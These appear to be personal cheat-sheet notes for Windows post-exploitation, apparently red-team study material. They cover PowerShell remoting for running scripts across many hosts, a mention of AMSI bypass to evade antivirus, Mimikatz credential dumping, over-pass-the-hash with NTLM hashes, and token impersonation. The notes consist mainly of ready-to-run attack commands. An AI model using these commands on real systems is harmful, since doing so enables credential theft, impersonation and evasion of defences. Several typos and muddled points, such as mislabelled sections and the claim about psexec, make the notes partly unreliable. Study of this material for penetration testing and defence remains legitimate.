Powerahell remoting
  • psexec - Enabled by default in Windows 2012 onwards.
  • Needs to enable (Enable-PSRemoting) in Windows Machine-> Admin priv is required.
  • Uses TCP 5985 (not encrypted) and  5986 (SSL) traffic in encryped

Types of Powershell remoting
  • One to one
     ☐ Interactive session and is Stateful. Requires Admin access on the machine to which remote session is about to happen.
     ☐ Estables PSSession 
     ☐ Enter-PSSession -ComputerName computer_name (For one to one remoting)
     ☐ New-PSSession
        ☐ This can be used by creating $session = New-PSSession -ComputerName computer_name
        ☐ Enter-PSSession -session $session
     ◇ One to Many - Non-interactive
         ☐ Invoke-Command
         ☐ Runs on multiple remote computers
         ☐ Passing the hashes
             ☐ Invoke-Command -ComputerName computer_name -Scriptblock{Commands} --> Allows to run command on a single machine.
             ☐ Invoke-Command -Scriptblock {Commands} -ComputerName (Get-Content <list of servers>) --> Allows to run commands on multiple servers at once.
             ☐ Invoke-Command -FilePath file_path -ComputerName computer_name --> Allows to run file on remote servers at once.
             ☐ Invoke-Command -ComputerName computer_name -Scriptblock ${function:function_name} -- Allows to run a function of a script on multiple servers at once. (Need to load the script first in the host machine that contains the function)
         ☐ Loading a script from host machine to the remote machine using session variable
             ☐ Create a new session with the remote machine using pssession:- $session = New-PSSession -ComputerName computer_name
             ☐ Load the script from the host machine into the session variable:- Invoke-Command -FilePath file_path -Session $session
             ☐ Remote session to the remote computer using the session variable:- Enter-PSSession -Session $session (Now the file_path file will be already into the memory of remote machine)
                 ☐   In some cases AMSIBypass code needs to be run on the remote machine to prevent Antivirus detection.
             ☐ Invoke-Command -Credentials
             ☐ Invoke-command -FilePath file_path -Session $session - Loads to run file on the remote machine by using a session variable.
             ☐ Enter-PSSession -Session $session - Using this to access the remote machine and then run the loaded script in it. 

Mimikatz
  • Invoke-Mimikatz -DumpCreds --> Dump credentials on a local machine
  • Invoke-Mimikatz -DumpCerts --> Dumps certs on a local machine.
  • Invoke-Mimikatz -DumpCreds -ComputerName @("syst1","syst2") --> Dumps creds on multiple remote machines. Reuquires credentials or admin access to the remote computer is required. (Uses Invoke-Command in background )

Create Over-pass-the-hash tokens from hashes (Basically writing in LSASS)
  • "Over pass the hash" creates a valid Kerberos Ticket using NTLM hash of the user.
  • Admin priv is required to run this command
  • Invoke-Mimikatz -Command '"sekurlsa::pth /user:username_name /domain:domain_name. /ntlm:<ntlm_hash> /run:powershell.exe"' 

Token Maniplution
  • Admin priv is required to run this command
  • Invoke-TokenManipulation -ShowAll --> List of all tokens on a machine
  • Invoke-TokenManipulation -Enumerate --> List all unique, usable tokens on the machine.
  • Invoke-TokenManipulation -ImpersonateUser -Username "domain\user" --> Start a new process with token of a specific user
  • Invoke-TokenManipulation -CreatreProcess "C:\Winodws\system32\WindowsPowershell\v1.0\Powershell.exe" -ProcessID 500 --> Start new process with token of another process



